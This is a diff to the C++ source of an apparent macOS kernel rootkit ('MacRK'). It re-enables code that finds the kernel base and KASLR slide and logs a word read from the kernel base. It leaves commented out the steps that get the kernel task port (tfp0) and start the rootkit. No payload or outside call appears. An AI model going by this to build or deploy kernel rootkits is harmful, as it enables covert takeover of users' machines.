@@ -33,15 +33,14 @@ bool IOKernelRootKitService::start(IOService *provider)
 {
 	kern_return_t ret = kIOReturnSuccess;
 
-	mach_vm_address_t kernel_base = 0;// Kernel::findKernelBase();
+	mach_vm_address_t kernel_base = Kernel::findKernelBase();
 
-	off_t kernel_slide = 0;// Kernel::findKernelSlide();
+	off_t kernel_slide = Kernel::findKernelSlide();
 
 	char buffer[128];
 
 	MAC_RK_LOG("MacRK::IOKernelRootKitService::start()!\n");
 
-	/*
 	snprintf(buffer, 128, "0x%llx", kernel_base);
 
 	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_base = %s\n", buffer);
@@ -49,17 +48,18 @@ bool IOKernelRootKitService::start(IOService *provider)
 	snprintf(buffer, 128, "0x%llx", kernel_slide);
 
 	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_slide = %s\n", buffer);
-	*/
 
-	/*
-	this->kernel = new Kernel(kernel_base, kernel_slide);
+	snprintf(buffer, 128, "0x%x", *(uint32_t*) kernel_base);
 
-	this->kernel->setRootKitService(this);
+	MAC_RK_LOG("MacRK::@ kernel base = %s\n", buffer);
 
-	this->tfp0 = this->kernel->getKernelTaskPort();
+	// this->kernel = new Kernel(kernel_base, kernel_slide);
 
-	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
-	*/
+	// this->kernel->setRootKitService(this);
+
+	// this->tfp0 = this->kernel->getKernelTaskPort();
+
+	// ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
 	if(ret == kIOReturnSuccess)
 	{
